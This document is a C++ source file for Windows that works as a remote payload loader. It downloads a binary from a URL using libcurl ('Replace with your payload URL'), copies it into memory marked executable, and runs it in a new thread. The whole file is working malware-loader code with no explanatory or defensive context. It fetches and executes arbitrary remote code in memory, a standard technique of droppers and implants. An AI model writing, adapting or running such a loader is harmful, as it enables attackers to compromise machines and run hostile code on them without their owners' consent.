#include <iostream>
#include <string>
#include <windows.h>
#include <curl/curl.h>
using namespace std;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t totalSize = size * nmemb;
    string* buffer = (string*)userp;
    buffer->append((char*)contents, totalSize);
    return totalSize;
}

string fetchPayload(const string& url) {
    CURL* curl;
    CURLcode res;
    string buffer;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            buffer.clear();
        }

        curl_easy_cleanup(curl);
    }
    return buffer;
}
int main() {
    string url = "https://example.com/payload.exe"; // Replace with your payload URL
    string payload = fetchPayload(url);

    if (payload.empty()) {
        return 1;
    }

    // Allocate memory for the payload
    void* payload_mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload_mem) {
        return 1;
    }

    // Copy the payload to the allocated memory
    memcpy(payload_mem, payload.data(), payload.size());

    // Create a thread to execute the payload
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_mem, NULL, 0, NULL);
    if (!thread) {
        VirtualFree(payload_mem, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for the thread to finish execution
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    // Free the allocated memory
    VirtualFree(payload_mem, 0, MEM_RELEASE);

    return 0;
}